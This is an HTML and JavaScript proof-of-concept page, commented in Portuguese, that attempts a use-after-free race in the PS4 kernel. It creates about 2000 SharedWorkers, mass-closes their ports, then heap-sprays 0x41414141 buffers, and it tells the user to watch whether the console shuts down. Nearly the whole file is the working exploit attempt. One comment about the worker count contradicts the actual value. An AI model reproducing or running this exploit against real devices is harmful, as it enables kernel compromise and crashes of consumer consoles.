<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 SharedWorker IPC UAF PoC</title>
    
</head>
<body>

    <h1>KERNEL IPC RACE POC</h1>
    
    <button onclick="runPrecisionExploit()">INICIAR TESTE</button>

    <div id="log">Aguardando início...</div>

    <script>
        // CONFIGURAÇÕES DO TESTE
        const TARGET_WORKERS = 2000; // Reduzido de 4500 para 3800 a seu pedido
        const SPRAY_SIZE = 1024 * 256; // 256KB por chunk
        const SPRAY_COUNT = 500; // Quantidade de chunks para alocar
        
        // PAYLOAD DE MEMÓRIA (Padrão de Bytes)
        // 0x41414141 = "AAAA" (Padrão clássico de exploit)
        // 0x00000000 = Zeros (Teste de Null Pointer)
        const PAYLOAD_VALUE = 0x41414141; 

        function log(msg) {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            el.innerHTML = `[${time}] ${msg}\n` + el.innerHTML;
        }

        function runPrecisionExploit() {
            log("=== INICIANDO POC SHAREDWORKER IPC ===");
            log(`Alvo: ${TARGET_WORKERS} conexões.`);
            log("Preparando heap...");

            if (!window.SharedWorker) {
                log("ERRO: SharedWorker não suportado neste firmware.");
                return;
            }

            let workers = [];
            let count = 0;

            // Intervalo rápido para criação (Flood)
            const interval = setInterval(() => {
                // Cria em lotes de 10 para não travar a UI completamente
                for (let i = 0; i < 10; i++) {
                    try {
                        // O nome único força o Kernel a criar uma nova estrutura de processo/IPC
                        const id = "ipc_uaf_" + count;
                        const sw = new SharedWorker("data:text/javascript,onconnect=function(e){let p=e.ports[0];p.start();}", id);
                        
                        // Inicia a porta explicitamente para alocar o handle no Kernel
                        sw.port.start();
                        workers.push(sw);
                        count++;

                    } catch (e) {
                        clearInterval(interval);
                        log("ERRO DE CRIAÇÃO (Limite atingido antes da hora): " + e.message);
                        // Se falhar antes, tentamos detonar com o que temos
                        triggerDestruction(workers);
                        return;
                    }
                }

                if (count % 200 === 0) log(`Workers ativos: ${count}...`);

                // GATILHO DE PRECISÃO
                if (count >= TARGET_WORKERS) {
                    clearInterval(interval);
                    log(`Alvo ${TARGET_WORKERS} atingido. Pausando para estabilizar (500ms)...`);
                    
                    // Pequena pausa para garantir que todos os workers foram registrados no Kernel
                    setTimeout(() => {
                        triggerDestruction(workers);
                    }, 500);
                }
            }, 5);
        }

        function triggerDestruction(workersList) {
            log("!!! INICIANDO FASE DE DESTRUIÇÃO !!!");
            log("Tentando Race Condition: Close() -> Nullify -> Spray");

            // 1. FECHAMENTO EM MASSA (Síncrono)
            // Tenta fechar os handles o mais rápido possível
            const total = workersList.length;
            try {
                for (let i = 0; i < total; i++) {
                    workersList[i].port.close();
                }
                log("Comando .close() enviado para todos os workers.");
            } catch (e) {
                log("Erro no loop de fechamento: " + e.message);
            }

            // 2. REMOÇÃO DE REFERÊNCIAS
            workersList = null; 
            
            // 3. HEAP SPRAY (Imediato)
            // Tenta ocupar o espaço que o Kernel está liberando agora em background
            log(`Injetando Heap Spray (${PAYLOAD_VALUE.toString(16)})...`);
            
            setTimeout(() => {
                try {
                    const pressure = [];
                    // Cria o buffer com o padrão escolhido
                    const chunk = new Uint32Array(SPRAY_SIZE).fill(PAYLOAD_VALUE);
                    
                    for (let i = 0; i < SPRAY_COUNT; i++) {
                        pressure.push(chunk.slice(0)); // Clona o chunk
                    }
                    
                    log("<span class='danger'>SPRAY CONCLUÍDO.</span>");
                    log("Se o console não desligar em 10 segundos, o teste falhou.");
                    log("Verifique se há instabilidade visual ou sonora.");
                    
                } catch (e) {
                    log("OOM (Out of Memory) durante o Spray - Isso também é bom.");
                }
            }, 50); // Delay mínimo para pegar a janela de corrida
        }
    </script>
</body>
</html>



